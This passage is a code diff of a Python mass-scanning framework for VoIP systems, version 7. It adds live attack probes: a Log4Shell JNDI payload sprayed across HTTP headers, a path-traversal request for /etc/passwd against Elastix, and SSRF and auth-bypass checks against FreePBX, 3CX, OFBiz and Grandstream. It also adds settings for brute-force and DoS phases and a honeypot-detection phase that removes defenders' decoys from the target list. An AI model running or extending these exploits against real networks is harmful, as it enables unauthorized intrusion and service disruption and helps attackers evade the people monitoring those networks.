@@ -17,7 +17,7 @@ Usage:  python3 main.py [targets_file] [cdr_file]
 Env:    VOIP_THREADS=100  VOIP_TIMEOUT=8  BATCH_SIZE=500  DEBUG=1
 """
 
-import asyncio, csv, hashlib, html as html_lib, json, logging, os
+import asyncio, csv, hashlib, html as html_lib, ipaddress, json, logging, os
 import random, re, signal, socket, struct, sys, time, uuid
 from collections import defaultdict
 from datetime import datetime, timezone
@@ -76,11 +76,27 @@ def sev_col(text:str, severity:str) -> str:
 # ══════════════════════════════════════════════════════════
 # CONFIGURATION
 # ══════════════════════════════════════════════════════════
-VERSION    = "6.0.0"
+VERSION    = "7.0.0"
 THREADS    = int(os.environ.get("VOIP_THREADS",  100))
 TIMEOUT    = int(os.environ.get("VOIP_TIMEOUT",    8))
 BATCH_SIZE = int(os.environ.get("BATCH_SIZE",    500))
 DEBUG      = os.environ.get("DEBUG","0") == "1"
+
+# Phase-specific concurrency tuning
+SEM_DISCOVERY  = THREADS
+SEM_FINGERPRINT= min(THREADS, 80)
+SEM_CVE        = min(THREADS, 60)
+SEM_SIP        = min(THREADS, 50)
+SEM_EXTENSION  = min(THREADS, 40)
+SEM_RTP        = min(THREADS, 80)
+SEM_STUN       = min(THREADS, 80)
+SEM_IAX2       = min(THREADS, 80)
+SEM_LEGACY     = min(THREADS, 80)
+SEM_TFTP       = min(THREADS, 80)
+SEM_AUTH       = min(THREADS, 30)   # slower, careful with brute
+SEM_DOS        = min(THREADS, 20)   # intentionally throttled
+SEM_MGMT       = min(THREADS, 50)
+SEM_VENDOR     = min(THREADS, 50)
 
 VOIP_PORTS   = [5060,5061,5062,2000,3065,5038,8088,4569,2427,2727,1720,10000]
 SIP_PORTS    = [5060,5061,5062]
@@ -290,15 +306,33 @@ PHONE_PROVISION_PATHS = [
 FAKE_MAC = "001122334455"
 LOG4J = "${jndi:ldap://log4shell-probe.invalid/voip}"
 
+# DB error keywords that indicate actual SQL injection reflection
+DB_ERROR_PATTERNS = re.compile(
+    r"(sql syntax|mysql_fetch|pg_query|sqlite_|unclosed quotation|"
+    r"ORA-\d{5}|you have an error in your sql|quoted string not properly terminated|"
+    r"invalid query|supplied argument is not a valid MySQL|"
+    r"unterminated string literal|SQLSTATE)",
+    re.I)
+
+# Patterns indicating actual file read in XXE/LFI
+FILE_READ_PATTERNS = re.compile(
+    r"root:x:0:0|/bin/bash|/bin/sh|daemon:x:|nobody:x:|www-data:x:",
+    re.I)
+
+# SSRF confirmation: internal service response disclosed
+SSRF_CONFIRM_PATTERNS = re.compile(
+    r"(127\.0\.0\.1|localhost|internal|admin panel|dashboard|"
+    r"<title>[^<]*(admin|internal|dashboard)[^<]*</title>)",
+    re.I)
+
 # ══════════════════════════════════════════════════════════
-# CONSOLE PRINTER  (replaces stdlib logging for pretty output)
+# CONSOLE PRINTER
 # ══════════════════════════════════════════════════════════
 
 _log_file_handle = None
 
 class Con:
     """Thread-safe pretty console + file logger."""
-    _lock = asyncio.Lock() if hasattr(asyncio,"Lock") else None
 
     @staticmethod
     def _ts() -> str:
@@ -343,10 +377,15 @@ class Con:
         cls._write(f"  {col('✗','red')} {msg}")
 
     @classmethod
+    def honeypot(cls, ip:str, reason:str):
+        cls._write(f"  {col('⊘','magenta')} {col('HONEYPOT','magenta')} "
+                   f"{col(ip,'cyan')} — {col(reason,'gray')}")
+
+    @classmethod
     def progress(cls, current:int, total:int, label:str=""):
         pct  = int(current/total*40) if total else 0
         bar  = col("█"*pct,"green") + col("░"*(40-pct),"gray")
-        cls._write(f"\r  {bar} {current}/{total} {label}     ", )
+        cls._write(f"\r  {bar} {current}/{total} {label}     ")
 
     @classmethod
     def finding(cls, ip:str, cve:str, title:str, severity:str):
@@ -365,7 +404,7 @@ class Con:
         cls._write(col(f"║{'Enterprise VoIP Security Automation Framework  v'+VERSION:^{w}}║","blue"))
         cls._write(col(f"║{'The most comprehensive open-source VoIP assessment tool':^{w}}║","gray"))
         cls._write(col("╠"+"═"*w+"╣","blue"))
-        cls._write(col(f"║  16 Phases │ 120+ CVEs │ 8 Protocols │ 60+ Unique Attacks{'':<20}║","cyan"))
+        cls._write(col(f"║  19 Phases │ 120+ CVEs │ 8 Protocols │ 80+ Unique Attacks{'':<18}║","cyan"))
         cls._write(col("╚"+"═"*w+"╝","blue"))
         cls._write("")
 
@@ -376,6 +415,7 @@ class Con:
 class State:
     def __init__(self):
         self.live_ips:        List[str]  = []
+        self.honeypot_ips:    Set[str]   = set()
         self.cve_findings:    List[dict] = []
         self.fingerprints:    List[dict] = []
         self.valid_extensions:List[str]  = []
@@ -392,6 +432,8 @@ class State:
 
     async def finding(self, ip:str, cve_id:str, title:str,
                       severity:str, desc:str, url:str=""):
+        if ip in self.honeypot_ips:
+            return
         key = f"{ip}|{cve_id}|{url}"
         async with self._cve_lock:
             if key in self._seen:
@@ -425,6 +467,9 @@ class State:
                          f"  URL: {f['url']}\n")
         (rd/"verified_voip_vulnerabilities.txt").write_text(
             "\n".join(lines),encoding="utf-8")
+        if self.honeypot_ips:
+            (rd/"honeypot_ips.txt").write_text(
+                "\n".join(sorted(self.honeypot_ips)),encoding="utf-8")
 
 # ══════════════════════════════════════════════════════════
 # SIP MESSAGE BUILDER (RFC 3261)
@@ -453,7 +498,7 @@ def sip_msg(method:str, ip:str, port:int=5060,
         f"From: <{frm_uri}>;tag={tag}\r\nCall-ID: {call_id}\r\n"
         f"CSeq: {cseq} {method}\r\n"
         f"Contact: <sip:{from_user}@scanner.local:5060>\r\n"
-        f"User-Agent: VoIP-SecFramework/6.0\r\n"
+        f"User-Agent: VoIP-SecFramework/7.0\r\n"
         f"Allow: INVITE,ACK,BYE,CANCEL,OPTIONS,REGISTER,REFER,SUBSCRIBE,NOTIFY,INFO\r\n"
         f"{extra_hdrs}{ct}Content-Length: {len(body_b)}\r\n\r\n"
     ).encode() + body_b
@@ -470,23 +515,59 @@ def sdp(ip:str, port:int=16384, secure:bool=False) -> str:
     return s
 
 # ══════════════════════════════════════════════════════════
-# NETWORK PRIMITIVES
+# NETWORK PRIMITIVES  (true async UDP, retries, timeouts)
 # ══════════════════════════════════════════════════════════
 
-async def udp_xfer(ip:str, port:int, data:bytes,
-                   timeout:float=4.0) -> Optional[bytes]:
+class _UDPProtocol(asyncio.DatagramProtocol):
+    def __init__(self, future: asyncio.Future):
+        self._fut = future
+
+    def datagram_received(self, data, addr):
+        if not self._fut.done():
+            self._fut.set_result(data)
+
+    def error_received(self, exc):
+        if not self._fut.done():
+            self._fut.set_exception(exc)
+
+    def connection_lost(self, exc):
+        if not self._fut.done():
+            self._fut.cancel()
+
+
+async def udp_xfer(ip: str, port: int, data: bytes,
+                   timeout: float = 4.0,
+                   retries: int = 1) -> Optional[bytes]:
+    """True async UDP send/recv using DatagramProtocol."""
     loop = asyncio.get_event_loop()
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.setblocking(False)
-    try:
-        await loop.run_in_executor(None, lambda: sock.sendto(data,(ip,port)))
-        return await asyncio.wait_for(
-            loop.run_in_executor(None, lambda: sock.recv(16384)), timeout=timeout)
-    except Exception:
-        return None
-    finally:
-        try: sock.close()
-        except: pass
+    for attempt in range(retries + 1):
+        fut: asyncio.Future = loop.create_future()
+        transport = None
+        try:
+            transport, _ = await asyncio.wait_for(
+                loop.create_datagram_endpoint(
+                    lambda: _UDPProtocol(fut),
+                    remote_addr=(ip, port)
+                ),
+                timeout=2.0
+            )
+            transport.sendto(data)
+            return await asyncio.wait_for(asyncio.shield(fut), timeout=timeout)
+        except asyncio.TimeoutError:
+            if attempt < retries:
+                await asyncio.sleep(0.1)
+            continue
+        except Exception:
+            if attempt < retries:
+                await asyncio.sleep(0.1)
+            continue
+        finally:
+            if transport and not transport.is_closing():
+                transport.close()
+            if not fut.done():
+                fut.cancel()
+    return None
+
 
 async def tcp_xfer(ip:str, port:int, data:bytes,
                    timeout:float=5.0) -> Optional[bytes]:
@@ -494,34 +575,48 @@ async def tcp_xfer(ip:str, port:int, data:bytes,
         r,w = await asyncio.wait_for(asyncio.open_connection(ip,port),timeout=timeout)
         w.write(data); await w.drain()
         resp = await asyncio.wait_for(r.read(32768),timeout=timeout)
-        try: w.close()
-        except: pass
+        try:
+            w.close()
+            await asyncio.wait_for(w.wait_closed(), timeout=1.0)
+        except Exception:
+            pass
         return resp
     except Exception:
         return None
 
+
 async def tcp_open(ip:str, port:int, timeout:float=3.0) -> bool:
     try:
         _,w = await asyncio.wait_for(asyncio.open_connection(ip,port),timeout=timeout)
-        try: w.close()
-        except: pass
+        try:
+            w.close()
+            await asyncio.wait_for(w.wait_closed(), timeout=1.0)
+        except Exception:
+            pass
         return True
     except Exception:
         return False
+
 
 async def udp_alive(ip:str, port:int, probe:bytes=b"\x00\x00",
                     timeout:float=2.0) -> bool:
     r = await udp_xfer(ip,port,probe,timeout)
     return r is not None
 
+
 async def sip_probe(ip:str, port:int, data:bytes,
                     timeout:float=5.0) -> Optional[str]:
-    for fn in (udp_xfer, tcp_xfer):
-        raw = await fn(ip,port,data,timeout)
-        if raw:
-            try: return raw.decode("utf-8",errors="replace")
-            except: return raw.decode("latin-1",errors="replace")
+    # Try UDP first, then TCP
+    raw = await udp_xfer(ip, port, data, timeout)
+    if raw:
+        try: return raw.decode("utf-8", errors="replace")
+        except: return raw.decode("latin-1", errors="replace")
+    raw = await tcp_xfer(ip, port, data, timeout)
+    if raw:
+        try: return raw.decode("utf-8", errors="replace")
+        except: return raw.decode("latin-1", errors="replace")
     return None
+
 
 # HTTP helper
 async def http_get(session, url:str,
@@ -529,7 +624,7 @@ async def http_get(session, url:str,
                    data:Optional[str]=None,
                    headers:Optional[dict]=None,
                    timeout:float=8.0) -> Tuple[int,str]:
-    if not HAS_AIOHTTP:
+    if not HAS_AIOHTTP or session is None:
         return await _urllib_req(url,auth,timeout)
     try:
         kw: dict = {"ssl":False,
@@ -545,12 +640,13 @@ async def http_get(session, url:str,
     except Exception:
         return 0,""
 
+
 async def _urllib_req(url:str, auth, timeout:float) -> Tuple[int,str]:
     import urllib.request, base64
     loop = asyncio.get_event_loop()
     def _do():
         req = urllib.request.Request(url)
-        req.add_header("User-Agent","VoIP-SecFramework/6.0")
+        req.add_header("User-Agent","VoIP-SecFramework/7.0")
         if auth:
             c = base64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode()
             req.add_header("Authorization",f"Basic {c}")
@@ -561,6 +657,7 @@ async def _urllib_req(url:str, auth, timeout:float) -> Tuple[int,str]:
             return getattr(e,"code",0),""
     return await loop.run_in_executor(None,_do)
 
+
 def new_session():
     if not HAS_AIOHTTP: return None
     conn = aiohttp.TCPConnector(ssl=False,limit=THREADS*3,
@@ -568,7 +665,7 @@ def new_session():
     return aiohttp.ClientSession(connector=conn,
                                  timeout=aiohttp.ClientTimeout(total=TIMEOUT))
 
-# Safe wrapper so a crashing attack never kills the phase
+
 async def safe(coro, label:str=""):
     try:
         return await coro
@@ -633,26 +730,24 @@ async def phase1_discovery(targets:List[str], state:State, sem:asyncio.Semaphore
         try:
             live = False
 
-            # Fast TCP check: SIP 5060, HTTP 80, SCCP 2000, H.323 1720
-            tasks = {p: tcp_open(ip,p,timeout=2.5)
-                     for p in [5060,5061,5062,80,443,8080,8088,2000,1720,5038]}
-            results = await asyncio.gather(*tasks.values(), return_exceptions=True)
-            tcp_open_ports = [p for p,(ok,r) in
-                              zip(tasks.keys(),
-                                  [(r,r) for r in results]) if r is True]
-
-            if tcp_open_ports:
+            # Fast TCP port check in parallel
+            check_ports = [5060,5061,5062,80,443,8080,8088,2000,1720,5038]
+            results = await asyncio.gather(
+                *[tcp_open(ip, p, timeout=2.5) for p in check_ports],
+                return_exceptions=True
+            )
+            if any(r is True for r in results):
                 live = True
 
             if not live:
                 # UDP SIP OPTIONS probe
                 pkt = sip_msg("OPTIONS", ip)
-                resp = await udp_xfer(ip, 5060, pkt, timeout=2.5)
+                resp = await udp_xfer(ip, 5060, pkt, timeout=2.5, retries=1)
                 if resp and b"SIP/2.0" in resp:
                     live = True
 
             if not live:
-                # IAX2 discovery (POKE frame)
+                # IAX2 POKE
                 iax_poke = b"\x80\x00\x00\x00\x00\x01\x00\x00\x1e"
                 r = await udp_xfer(ip, IAX2_PORT, iax_poke, timeout=2.0)
                 if r:
@@ -678,7 +773,6 @@ async def phase1_discovery(targets:List[str], state:State, sem:asyncio.Semaphore
                 Con.info(f"Progress: {done}/{total} scanned  │  "
                          f"{col(str(found),'green')} live hosts found")
 
-    # Process in batches
     for i in range(0, total, BATCH_SIZE):
         batch = targets[i:i+BATCH_SIZE]
         await asyncio.gather(*[_sem_probe(sem, probe, ip) for ip in batch])
@@ -688,15 +782,16 @@ async def phase1_discovery(targets:List[str], state:State, sem:asyncio.Semaphore
     state.live_ips = [ip for ip in state.live_ips
                       if ip not in seen and not seen.add(ip)]
 
-    # Optional nmap enrichment
     await _nmap_enrich(state)
 
     Con.ok(f"Phase 1 complete — {col(str(len(state.live_ips)),'green')} live hosts │ "
            f"IAX2:{len(state.iax2_hosts)} MGCP:{len(state.mgcp_hosts)}")
 
+
 async def _sem_probe(sem:asyncio.Semaphore, fn, *args):
     async with sem:
         return await fn(*args)
+
 
 async def _nmap_enrich(state:State):
     try:
@@ -723,14 +818,135 @@ async def _nmap_enrich(state:State):
     except: pass
 
 # ══════════════════════════════════════════════════════════
+# PHASE 1B — Honeypot / Fake-Server Detection
+# ══════════════════════════════════════════════════════════
+async def phase1b_honeypot(state:State, sem:asyncio.Semaphore):
+    Con.phase("PHASE 1B │ HONEYPOT & FAKE-SERVER DETECTION")
+    if not state.live_ips:
+        Con.warn("No live hosts — skipping honeypot detection"); return
+
+    Con.info(f"Analyzing {len(state.live_ips)} hosts for honeypot characteristics …")
+    detected = 0
+
+    async def analyze(ip:str):
+        nonlocal detected
+        reasons: List[str] = []
+
+        # Test 1: Send two OPTIONS with different Call-IDs/branches.
+        # Strip variable fields and compare — real servers have per-request variation
+        # (timestamps, nonces, etc.); honeypots often return identical template responses.
+        pkt1 = sip_msg("OPTIONS", ip)
+        pkt2 = sip_msg("OPTIONS", ip)
+        r1 = await udp_xfer(ip, 5060, pkt1, timeout=3.0)
+        await asyncio.sleep(0.05)
+        r2 = await udp_xfer(ip, 5060, pkt2, timeout=3.0)
+
+        if r1 and r2:
+            def _strip_variable(s: str) -> str:
+                s = re.sub(r'branch=z9hG4bK[^\s;,\r\n]+', 'BRANCH', s)
+                s = re.sub(r'Call-ID: [^\r\n]+', 'CALLID', s)
+                s = re.sub(r'tag=[^\s;,\r\n]+', 'TAG', s)
+                s = re.sub(r'nonce="[^"]+"', 'NONCE', s)
+                s = re.sub(r'\d{2}:\d{2}:\d{2}', 'TIME', s)
+                return s
+            d1 = _strip_variable(r1.decode(errors="replace"))
+            d2 = _strip_variable(r2.decode(errors="replace"))
+            if d1 == d2:
+                reasons.append("identical-responses-to-distinct-requests")
+
+        # Test 2: All major ports open simultaneously
+        # Real VoIP servers typically have only 2-4 specific ports open.
+        # Honeypots often open everything to look "real".
+        port_checks = [5060,5061,5038,8088,2000,1720,4569,2427,80,443,8080,25,110,143]
+        check_results = await asyncio.gather(
+            *[tcp_open(ip, p, timeout=1.5) for p in port_checks],
+            return_exceptions=True
+        )
+        open_count = sum(1 for r in check_results if r is True)
+        if open_count >= 10:
+            reasons.append(f"too-many-open-ports({open_count}/{len(port_checks)})")
+
+        # Test 3: SIP server returns 200 OK to ALL methods without auth
+        # Real servers reject REGISTER/REFER without credentials (401/403).
+        # A honeypot may accept everything to log attacker behavior.
+        all_200 = 0
+        for method in ["REGISTER", "REFER", "INVITE"]:
+            pkt = sip_msg(method, ip,
+                          extra_hdrs="Expires: 60\r\n" if method == "REGISTER" else "",
+                          body=sdp(ip) if method == "INVITE" else "")
+            resp = await udp_xfer(ip, 5060, pkt, timeout=2.5)
+            if resp and b"200 OK" in resp:
+                all_200 += 1
+        if all_200 >= 3:
+            reasons.append("accepts-all-sip-methods-without-auth")
+
+        # Test 4: SIP response time uniformity
+        # Measure 5 OPTIONS response times — if standard deviation < 1ms
+        # across all 5, it's likely a scripted/automated responder.
+        times = []
+        for _ in range(5):
+            t0 = time.monotonic()
+            pkt = sip_msg("OPTIONS", ip)
+            resp = await udp_xfer(ip, 5060, pkt, timeout=2.0)
+            if resp:
+                times.append(time.monotonic() - t0)
+            await asyncio.sleep(0.02)
+        if len(times) == 5:
+            avg = sum(times) / 5
+            variance = sum((t - avg)**2 for t in times) / 5
+            stddev = variance**0.5
+            if stddev < 0.001 and avg < 0.010:
+                # Under 1ms response time with <1ms stddev = template engine
+                reasons.append(f"robotic-response-timing(avg={avg*1000:.2f}ms,σ={stddev*1000:.3f}ms)")
+
+        # Test 5: SIP User-Agent vs HTTP Server header vendor mismatch
+        # A real Asterisk box doesn't say "Apache" as its web server.
+        # Honeypots sometimes mix vendor indicators.
+        vendors_seen: Set[str] = set()
+        sip_resp = await udp_xfer(ip, 5060, sip_msg("OPTIONS", ip), timeout=3.0)
+        if sip_resp:
+            m = re.search(rb'(?:Server|User-Agent):\s*([^\r\n]+)', sip_resp, re.I)
+            if m:
+                ua = m.group(1).decode(errors="replace").lower()
+                for vendor, kws in VENDOR_MAP:
+                    if any(k in ua for k in kws):
+                        vendors_seen.add(vendor)
+        for proto, port in [("http", 80), ("http", 8080)]:
+            try:
+                raw = await tcp_xfer(ip, port,
+                    b"HEAD / HTTP/1.0\r\nHost: " + ip.encode() + b"\r\n\r\n", timeout=3.0)
+                if raw:
+                    decoded = raw.decode(errors="replace")
+                    for vendor, kws in VENDOR_MAP:
+                        if any(k in decoded.lower() for k in kws):
+                            vendors_seen.add(vendor)
+            except Exception:
+                pass
+        if len(vendors_seen) >= 3:
+            reasons.append(f"conflicting-vendor-claims({','.join(list(vendors_seen)[:3])})")
+
+        if reasons:
+            state.honeypot_ips.add(ip)
+            Con.honeypot(ip, " | ".join(reasons))
+            detected += 1
+
+    await asyncio.gather(*[_sem_probe(sem, analyze, ip) for ip in state.live_ips])
+
+    # Remove honeypots from live_ips
+    before = len(state.live_ips)
+    state.live_ips = [ip for ip in state.live_ips if ip not in state.honeypot_ips]
+    after = len(state.live_ips)
+    Con.ok(f"Phase 1B complete — {detected} honeypots excluded, "
+           f"{after} hosts remaining for active testing")
+
+# ══════════════════════════════════════════════════════════
 # PHASE 2 — Fingerprinting
 # ══════════════════════════════════════════════════════════
 async def phase2_fingerprint(state:State, sess, sem:asyncio.Semaphore):
     Con.phase("PHASE 2 │ DEEP SERVICE FINGERPRINTING")
     if not state.live_ips:
-        Con.warn("No live hosts — fingerprinting still attempted on top 20 targets")
+        Con.warn("No live hosts — skipping fingerprinting"); return
 
-    targets = state.live_ips or []
     done = 0
 
     async def fp(ip:str):
@@ -753,8 +969,12 @@ async def phase2_fingerprint(state:State, sess, sem:asyncio.Semaphore):
                     break
 
             ports_open = []
-            for p in VOIP_PORTS:
-                if await tcp_open(ip,p,timeout=1.5):
+            port_results = await asyncio.gather(
+                *[tcp_open(ip, p, timeout=1.5) for p in VOIP_PORTS],
+                return_exceptions=True
+            )
+            for p, ok in zip(VOIP_PORTS, port_results):
+                if ok is True:
                     ports_open.append(p)
 
             vendor = detect_vendor(sip_b, http_b)
@@ -770,12 +990,12 @@ async def phase2_fingerprint(state:State, sess, sem:asyncio.Semaphore):
         finally:
             done += 1
 
-    await asyncio.gather(*[_sem_probe(sem, fp, ip) for ip in targets])
+    await asyncio.gather(*[_sem_probe(sem, fp, ip) for ip in state.live_ips])
     Con.ok(f"Phase 2 complete — {done} hosts fingerprinted, "
            f"{sum(1 for f in state.fingerprints if f['vendor']!='Unknown')} identified")
 
 # ══════════════════════════════════════════════════════════
-# PHASE 3 — CVE Detection (HTTP-based)
+# PHASE 3 — CVE Detection (HTTP-based, requires evidence)
 # ══════════════════════════════════════════════════════════
 async def phase3_cve(state:State, sess, sem:asyncio.Semaphore):
     Con.phase("PHASE 3 │ CVE & VULNERABILITY DETECTION")
@@ -812,6 +1032,7 @@ async def phase3_cve(state:State, sess, sem:asyncio.Semaphore):
     await asyncio.gather(*[_sem_probe(sem, scan, ip) for ip in state.live_ips])
     Con.ok(f"Phase 3 complete — {len(state.cve_findings)} findings total")
 
+
 async def _http_voipmonitor(ip,st,sess):
     c,b = await http_get(sess,f"http://{ip}/index.php",timeout=5)
     if c and "VoIPmonitor" in b:
@@ -823,47 +1044,80 @@ async def _http_voipmonitor(ip,st,sess):
         await st.finding(ip,"CVE-2021-30461",
             f"VoIPmonitor v{ver} {'(VULNERABLE <24.61)' if sev=='CRITICAL' else '(patched)'}",
             sev,f"Admin panel at http://{ip}/index.php",f"http://{ip}/index.php")
-        # cdrproxy RCE
+        # cdrproxy RCE — verify by checking actual SSRF response content
         c2,b2 = await http_get(sess,f"http://{ip}/cdrproxy.php?host=127.0.0.1",timeout=5)
-        if c2==200:
+        if c2==200 and re.search(r'(cdr|proxy|response|result)',b2,re.I):
             await st.finding(ip,"CVE-2021-30461-B",
-                "VoIPmonitor cdrproxy SSRF/RCE",
-                "CRITICAL","cdrproxy.php reachable without auth",
+                "VoIPmonitor cdrproxy SSRF/RCE confirmed",
+                "CRITICAL","cdrproxy.php fetches internal hosts without auth",
                 f"http://{ip}/cdrproxy.php")
+
 
 async def _http_3cx(ip,st,sess):
     for url in [f"http://{ip}:5000/webclient",f"https://{ip}:5001/webclient"]:
         c,b = await http_get(sess,url,timeout=5)
         if c and "3CX" in b:
-            await st.finding(ip,"CVE-2021-26260","3CX Auth Bypass","HIGH",
-                "3CX detected",url)
+            # Verify auth bypass: try admin API without credentials
+            ca,ba = await http_get(sess,f"http://{ip}:5000/api/v1/status",timeout=5)
+            if ca==200 and re.search(r'(version|uptime|status)',ba,re.I):
+                await st.finding(ip,"CVE-2021-26260","3CX Auth Bypass — API returns data without auth","CRITICAL",
+                    "3CX management API accessible without authentication",url)
+            else:
+                await st.finding(ip,"CVE-2021-26260","3CX PhoneSystem Detected — Auth Bypass Possible","HIGH",
+                    "3CX detected — verify CVE-2021-26260 manually",url)
             return
+
 
 async def _http_3cx_supply_chain(ip,st,sess):
     for url in [f"http://{ip}:5000/api/v1/status",f"https://{ip}:5001/api/v1/status"]:
         c,b = await http_get(sess,url,timeout=5)
-        if c and re.search(r'3cx|phonesystem',b,re.I):
-            await st.finding(ip,"CVE-2023-29059","3CX Supply-Chain Backdoor",
-                "CRITICAL","3CX management API open — verify desktop app version",url)
+        if c==200 and re.search(r'3cx|phonesystem',b,re.I):
+            # Supply-chain check: look for version indicators for affected builds
+            ver_m = re.search(r'"version"\s*:\s*"([^"]+)"',b)
+            ver_str = ver_m.group(1) if ver_m else "unknown"
+            await st.finding(ip,"CVE-2023-29059","3CX Supply-Chain — Management API Open",
+                "CRITICAL",
+                f"3CX v{ver_str}: Verify desktop app update mechanism for backdoored builds",url)
             return
+
 
 async def _http_ofbiz(ip,st,sess):
     c,b = await http_get(sess,f"http://{ip}:8080/webtools/control/main",timeout=5)
     if c and "OFBiz" in b:
+        # Try the actual auth bypass endpoint for CVE-2020-9496
+        c2,b2 = await http_get(sess,
+            f"http://{ip}:8080/webtools/control/main/ProgramExport;jsessionid=x",timeout=5)
+        sev = "CRITICAL" if c2 not in (401,403,404) else "HIGH"
         await st.finding(ip,"CVE-2020-9496","Apache OFBiz Auth Bypass RCE",
-            "CRITICAL","OFBiz at port 8080",f"http://{ip}:8080/webtools")
+            sev,"OFBiz detected" + (" — ProgramExport reachable" if sev=="CRITICAL" else ""),
+            f"http://{ip}:8080/webtools")
+
 
 async def _http_freepbx(ip,st,sess):
+    # First confirm it's actually FreePBX, then test specific vuln endpoints
+    c0,b0 = await http_get(sess,f"http://{ip}/admin/",timeout=5)
+    if not (c0 and re.search(r'freepbx|sangoma|framework',b0,re.I)):
+        return  # Not FreePBX — skip
+
     for path,cve,title in [
         ("/admin/ajax.php?module=framework&command=checkDependencies","CVE-2022-26272","FreePBX Module Upload RCE"),
         ("/admin/ajax.php?module=userman&command=getAll","CVE-2020-36166","FreePBX Unauth RCE"),
         ("/admin/config.php?display=phonebook&view=default","CVE-2023-49786","FreePBX SSRF"),
+        ("/admin/modules.php","CVE-2019-11334","FreePBX Module Admin Exposed"),
     ]:
         c,b = await http_get(sess,f"http://{ip}{path}",timeout=5)
-        if c and re.search(r'freepbx|sangoma|framework',b,re.I):
+        # Require an actual data response — not just a redirect to login
+        if c==200 and re.search(r'(json|result|success|module|data)',b,re.I) \
+                and not re.search(r'(location|login|password)',b,re.I):
             await st.finding(ip,cve,title,"CRITICAL",
-                f"FreePBX panel accessible",f"http://{ip}{path}")
+                f"FreePBX endpoint returns data without auth",f"http://{ip}{path}")
             return
+        elif c==200 and re.search(r'freepbx|sangoma',b,re.I):
+            await st.finding(ip,cve,title,"HIGH",
+                f"FreePBX admin panel accessible — verify auth bypass manually",
+                f"http://{ip}{path}")
+            return
+
 
 async def _http_mitel(ip,st,sess):
     for path,cve,title,sev in [
@@ -877,14 +1131,19 @@ async def _http_mitel(ip,st,sess):
                     f"{proto}://{ip}:{port}{path}")
                 return
 
+
 async def _http_grandstream(ip,st,sess):
     for url,cve,title in [
         (f"http://{ip}:8089/cgi-bin/api.values.get","CVE-2022-37397","Grandstream UCM SQL Injection"),
         (f"http://{ip}:8089/cgi-bin/api-sys_performance.cgi","CVE-2020-5736","Grandstream UCM Unauth RCE"),
     ]:
         c,b = await http_get(sess,url,timeout=5)
-        if c and re.search(r'grandstream|ucm|result',b,re.I):
-            await st.finding(ip,cve,title,"CRITICAL","UCM API reachable",url)
+        if c==200 and re.search(r'grandstream|ucm',b,re.I):
+            # Verify actual unauthenticated data returned
+            if re.search(r'(response|result|value|system|cpu|memory)',b,re.I):
+                await st.finding(ip,cve,title,"CRITICAL",
+                    "Grandstream UCM API returns system data without authentication",url)
+
 
 async def _http_cisco_phone(ip,st,sess):
     for path,cve,title in [
@@ -895,11 +1154,12 @@ async def _http_cisco_phone(ip,st,sess):
     ]:
         for proto in ("http","https"):
             c,b = await http_get(sess,f"{proto}://{ip}{path}",timeout=5)
-            if c==200:
+            if c==200 and re.search(r'cisco|cucm|phone|serviceability',b,re.I):
                 await st.finding(ip,cve,title,"CRITICAL",
-                    f"Cisco endpoint at {proto}://{ip}{path}",
+                    f"Cisco endpoint returns data at {proto}://{ip}{path}",
                     f"{proto}://{ip}{path}")
                 return
+
 
 async def _http_avaya(ip,st,sess):
     for url,pat,cve,title in [
@@ -912,37 +1172,75 @@ async def _http_avaya(ip,st,sess):
             await st.finding(ip,cve,title,"CRITICAL",f"Avaya at {url}",url)
             return
 
+
 async def _http_elastix(ip,st,sess):
+    # Verify LFI by checking for actual /etc/passwd content in response
     lfi = (f"https://{ip}/vtigercrm/graph.php?current_language="
            "../../../../../../../../etc/passwd%00&module=Accounts&action=")
     c,b = await http_get(sess,lfi,timeout=5)
-    if c and "root:x:0:0" in b:
-        await st.finding(ip,"CVE-2012-4869","Elastix LFI /etc/passwd exposed",
-            "CRITICAL","LFI via vtigercrm",lfi)
+    if c and FILE_READ_PATTERNS.search(b):
+        await st.finding(ip,"CVE-2012-4869","Elastix LFI — /etc/passwd Confirmed Readable",
+            "CRITICAL","Confirmed: /etc/passwd content returned in response body",lfi)
+    elif c and re.search(r'elastix|issabel',b,re.I):
+        # Just detected, LFI not confirmed
+        c2,b2 = await http_get(sess,f"https://{ip}/modules/admin/index.php",timeout=5)
+        if c2 and re.search(r'elastix|issabel',b2,re.I):
+            await st.finding(ip,"CVE-2012-4869","Elastix Detected — LFI Possible (unconfirmed)",
+                "HIGH","Elastix panel accessible — test CVE-2012-4869 manually",lfi)
+
 
 async def _http_log4shell(ip,st,sess):
-    hdr = {"X-Api-Version":LOG4J,"User-Agent":LOG4J,"X-Forwarded-For":LOG4J}
+    """
+    Log4Shell detection: we send the JNDI payload and look for evidence of processing.
+    Without a real callback infrastructure (DNS/LDAP listener), we cannot confirm RCE.
+    We report as MEDIUM 'probe delivered' only when the app actually processed the request.
+    Reporting CRITICAL would be a false positive without DNS callback confirmation.
+    """
+    hdr = {
+        "X-Api-Version": LOG4J,
+        "User-Agent":     LOG4J,
+        "X-Forwarded-For":LOG4J,
+        "Referer":        LOG4J,
+    }
     for proto,port in [("http",80),("http",8080),("https",443),("https",8443)]:
-        for path in ["/admin/","/login","/api/v1/login"]:
-            c,_ = await http_get(sess,f"{proto}://{ip}:{port}{path}",
-                                 headers=hdr,timeout=5)
+        for path in ["/admin/","/login","/api/v1/login","/api/"]:
+            c,body = await http_get(sess,f"{proto}://{ip}:{port}{path}",
+                                    headers=hdr,timeout=5)
             if c in (200,401,403,302):
-                await st.finding(ip,"CVE-2021-44228","Log4Shell Payload Delivered",
-                    "CRITICAL","Log4j JNDI payload injected — monitor for DNS callback",
-                    f"{proto}://{ip}:{port}{path}")
-                return
+                # Check for evidence that Log4j is present (error message, Java stack trace)
+                if re.search(r'(log4j|jndi|ldap|java\.lang\.|at com\.|javax\.naming)',
+                             body, re.I):
+                    await st.finding(ip,"CVE-2021-44228",
+                        "Log4Shell — Java/Log4j stack trace detected in response",
+                        "CRITICAL",
+                        "Response contains Java/JNDI indicators after Log4Shell probe",
+                        f"{proto}://{ip}:{port}{path}")
+                    return
+                elif c in (200,401,403):
+                    # App is reachable but no confirmation of Log4j — note for manual testing
+                    await st.finding(ip,"CVE-2021-44228",
+                        "Log4Shell Probe Delivered — Manual DNS callback verification required",
+                        "MEDIUM",
+                        "JNDI payload sent to endpoint; confirm with out-of-band DNS listener",
+                        f"{proto}://{ip}:{port}{path}")
+                    return
+
 
 async def _http_ssrf(ip,st,sess):
     for path in ["/api/fetch?url=http://localhost/admin",
